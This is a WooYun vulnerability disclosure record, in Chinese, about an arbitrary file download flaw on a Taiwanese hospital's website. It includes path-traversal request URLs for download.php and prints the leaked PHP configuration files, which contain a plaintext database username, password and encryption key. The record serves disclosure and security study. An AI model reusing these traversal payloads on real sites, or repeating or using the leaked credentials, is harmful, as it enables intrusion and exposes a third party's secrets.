{"id": 75504, "wybug_id": "wooyun-2016-0167299", "wybug_title": "基督復臨安息日會醫療財團法人臺安醫院任意文件下载（臺灣地區）", "wybug_corp": "Hitcon台湾互联网漏洞报告平台", "wybug_author": "j0k3r", "wybug_date": "2016-01-05 09:33", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： rt 详细说明：  目标：http://**.**.**.**构造，\nhttp://**.**.**.**/orthopedics/download.php?name=../../orthopedics/download.php\n\n\nmysql配置文件下载，\nhttp://**.**.**.**/orthopedics/download.php?name=../../lib/dbkeyfunc_mysql/dbkeyfunc_mysql.inc.php\ndbkeyfunc_mysql.inc.php中\n<?php$DBhost =\"localhost\";$DBuser = \"cash\";$DBpass = \"cash1979417\";$dbhost = \"localhost\";$dbuser = \"cash\";$dbpass = \"cash1979417\";$link = mysql_connect(\"localhost\",$dbuser,$dbpass);mysql_select_db($dbname,$link);?>\n另一文件，\nhttp://**.**.**.**/orthopedics/download.php?name=../../main/config.inc.php\nconfig.inc.php中\n<?php$dbhost = \"localhost\";$dbuser = \"cash\";$dbpass = \"cash1979417\";$dbhost = \"localhost\";//資料庫$all_db = \"tahsdaorgtwmysql8\";//資料表$categories = \"tahsda_categories\";$contents = \"tahsda_contents\";$users = \"tahsda_users\";$news = \"tahsda_news\";$honor = \"tahsda_honor\";$video = \"tahsda_youtube_tahvideo\";$hire = \"tahsda_hire\";$epapertable = \"epaper_maillist\"; //epaper資料表$custmermail = \"tahsda_custmermail\";//加密及解密函數鍵值$password_key = \"tahsda123949\";//選取資料數$limit = \"10\";$db = mysql_connect($dbhost,$dbuser,$dbpass);mysql_select_db($all_db,$db);//存入utf8格式mysql_query(\"SET NAMES 'utf8'\");// 去除 Magic Quotes 的影響if (get_magic_quotes_gpc()){  $_GET = array_map('stripslashes', $_GET);  $_POST = array_map('stripslashes', $_POST);  $_COOKIE = array_map('stripslashes', $_COOKIE);  $_REQUEST = array_map('stripslashes', $_REQUEST);}?>\n泄露了数据库配置信息，加解密函数键值以及防注入处理   漏洞证明：  \n\ndbkeyfunc_mysql.inc.php中\n<?php$DBhost =\"localhost\";$DBuser = \"cash\";$DBpass = \"cash1979417\";$dbhost = \"localhost\";$dbuser = \"cash\";$dbpass = \"cash1979417\";$link = mysql_connect(\"localhost\",$dbuser,$dbpass);mysql_select_db($dbname,$link);?>\n   修复方案：  ..   版权声明：转载请注明来源 j0k3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2016-01-08 03:38 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}